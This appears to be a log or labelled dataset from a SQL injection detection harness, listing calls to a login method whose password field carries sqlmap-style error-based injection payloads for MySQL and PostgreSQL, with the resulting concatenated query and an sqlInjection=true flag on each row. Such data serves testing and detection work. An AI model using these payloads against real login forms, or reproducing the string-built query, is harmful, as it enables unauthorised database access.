SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345')) AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND (('BuQv'='BuQv	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345')) AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND (('BuQv'='BuQv';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345'))) AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ((('uaYA'='uaYA	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345'))) AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ((('uaYA'='uaYA';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'yzcm'='yzcm	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'yzcm'='yzcm';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345') AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ('jBnJ' LIKE 'jBnJ	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345') AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ('jBnJ' LIKE 'jBnJ';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345')) AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND (('jOJx' LIKE 'jOJx	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345')) AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND (('jOJx' LIKE 'jOJx';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345'))) AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ((('dgQu' LIKE 'dgQu	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345'))) AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ((('dgQu' LIKE 'dgQu';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'tRFR' LIKE 'tRFR	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'tRFR' LIKE 'tRFR';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345") AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ("Pqdh"="Pqdh	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345") AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ("Pqdh"="Pqdh';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345")) AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND (("yStA"="yStA	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345")) AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND (("yStA"="yStA';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345"))) AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ((("aRSZ"="aRSZ	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345"))) AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ((("aRSZ"="aRSZ';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND "fAiX"="fAiX	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND "fAiX"="fAiX';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345") AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ("zLeP" LIKE "zLeP	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345") AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ("zLeP" LIKE "zLeP';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345")) AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND (("hwOI" LIKE "hwOI	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345")) AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND (("hwOI" LIKE "hwOI';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345"))) AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ((("FpOK" LIKE "FpOK	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345"))) AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ((("FpOK" LIKE "FpOK';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND "kTJW" LIKE "kTJW	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND (SELECT 5133 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (5133=5133) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND "kTJW" LIKE "kTJW';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345) AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345') AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345') AND 4429=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (4429=4429) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)';	sqlInjection--KEY_VALUE_SEPARATOR--true
